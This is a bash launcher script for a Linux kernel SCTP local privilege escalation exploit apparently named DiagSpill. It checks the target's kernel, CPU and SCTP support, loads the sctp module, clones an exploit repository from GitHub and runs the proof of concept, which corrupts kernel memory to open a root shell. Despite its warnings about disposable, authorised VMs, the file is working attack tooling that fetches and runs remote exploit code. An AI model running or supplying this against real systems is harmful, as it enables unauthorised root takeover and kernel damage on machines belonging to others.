#!/usr/bin/env bash
# ==============================================================================
#  DiagSpill  —  CVE-2026-74469
#  Linux kernel SCTP sctp_diag local privilege escalation -> root
#  Public release: 18 Sep 2026  (LPE quartet, Asim Manizada)
#
#  This .sh is a LAUNCHER. The actual exploit is the upstream Python PoC
#  (diagspill_root_repro.py, which embeds a C payload). No genuine standalone
#  .sh exploit exists for this CVE.
#
#  !! DESTRUCTIVE !!  Overwrites ~8 MiB of kernel memory and holds corrupted
#  page tables until reboot. Run ONLY in a throwaway VM / disposable host
#  you own or are explicitly authorized to test. Reboot afterwards.
# ==============================================================================
set -uo pipefail

REPO_URL="https://github.com/manizada/DiagSpill.git"
WORKDIR="${WORKDIR:-$HOME/diagspill}"
POC="diagspill_root_repro.py"

RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'; CYN='\033[0;36m'; BLD='\033[1m'; NC='\033[0m'
ok(){   echo -e "${GRN}[ OK ]${NC} $*"; }
bad(){  echo -e "${RED}[FAIL]${NC} $*"; }
warn(){ echo -e "${YEL}[WARN]${NC} $*"; }
info(){ echo -e "${CYN}[INFO]${NC} $*"; }
die(){  bad "$*"; exit 1; }

echo -e "${BLD}=== DiagSpill launcher — CVE-2026-74469 ===${NC}"

# ---------- 0. must NOT already be root ----------
if [[ $EUID -eq 0 ]]; then
  die "Run as an UNPRIVILEGED user (escalation must start low)."
fi

# ---------- 1. kernel / arch / cpu / ram prerequisites ----------
KREL="$(uname -r)"
ARCH="$(uname -m)"
info "kernel : $KREL"
info "arch   : $ARCH"

[[ "$ARCH" == "x86_64" ]] || die "PoC assumes x86-64 (4 KiB pages)."

NCPU="$(nproc)"
if [[ "$NCPU" != "4" ]]; then
  warn "PoC was tuned for exactly 4 online logical CPUs (you have $NCPU)."
  warn "You may need to edit grooming constants or pin affinity to CPUs 0-3."
fi

MEMK="$(awk '/MemTotal/{print $2}' /proc/meminfo)"
if (( MEMK < 3700000 || MEMK > 4200000 )); then
  warn "PoC was tuned for MemTotal 3,700,000-4,200,000 KiB (you have $MEMK KiB)."
fi

case "$KREL" in
  *6.17.0-35-generic*|*6.19.10-300.fc44*) ok "kernel matches a tested target" ;;
  *) warn "Non-tested kernel ($KREL). Upstream-fixed: 5.10.265 5.15.216 6.1.183 6.6.151 6.12.103 6.18.44 7.1.8 7.2-rc6" ;;
esac

# ---------- 2. SCTP support (the only real prerequisite) ----------
SCTP_OK=1
if lsmod | grep -q '^sctp\b' || [[ -d /sys/module/sctp ]] || modinfo sctp &>/dev/null; then
  ok "SCTP present (module built-in/available)"
  grep -q '^sctp' /proc/modules 2>/dev/null || modprobe sctp 2>/dev/null || true
else
  warn "SCTP not found — attempting modprobe"
  modprobe sctp 2>/dev/null && ok "sctp loaded" || { SCTP_OK=0; }
fi
[[ -e /proc/net/sctp/assocs || -d /sys/module/sctp ]] && ok "SCTP active" || SCTP_OK=0
(( SCTP_OK )) || die "SCTP/sctp_diag unavailable — target not exploitable via this path."

# ---------- 3. toolchain ----------
for t in git python3 cc make; do
  command -v "$t" >/dev/null || die "missing dependency: $t"
done
python3 -c 'import sys; sys.exit(0 if sys.version_info>=(3,9) else 1)' || die "need Python 3.9+"
[[ -f /usr/include/linux/sctp.h || -f /usr/include/netinet/sctp.h ]] \
  || warn "Linux UAPI/libc SCTP headers not obviously present — install libc6-dev / linux-libc-dev"
ok "toolchain ready"

# ---------- 4. fetch the real PoC ----------
mkdir -p "$WORKDIR"
if [[ -d "$WORKDIR/DiagSpill/.git" ]]; then
  info "repo exists, pulling latest"; git -C "$WORKDIR/DiagSpill" pull --ff-only || true
else
  info "cloning $REPO_URL"
  git clone --depth 1 "$REPO_URL" "$WORKDIR/DiagSpill" || die "git clone failed (network?)"
fi
[[ -f "$WORKDIR/DiagSpill/$POC" ]] || die "PoC not found in repo"
ok "PoC present: $WORKDIR/DiagSpill/$POC"

# ---------- 5. final confirmation ----------
echo
warn "This will CORRUPT kernel memory (~8 MiB) and open a root shell."
warn "Only proceed in a disposable VM. Reboot afterwards to release diagspill_hold."
read -r -p "Type EXACTLY 'yes-run' to proceed: " c
[[ "$c" == "yes-run" ]] || die "aborted by user"

# ---------- 6. run it ----------
cd "$WORKDIR/DiagSpill"
info "launching exploit ... (can take a while to build the SCTP association)"
python3 "$POC"
rc=$?
if [[ $rc -eq 0 ]]; then
  ok "PoC finished cleanly. A root shell via sudo should be available."
else
  bad "PoC exited rc=$rc. Kernel may be unstable — REBOOT NOW."
fi
exit $rc
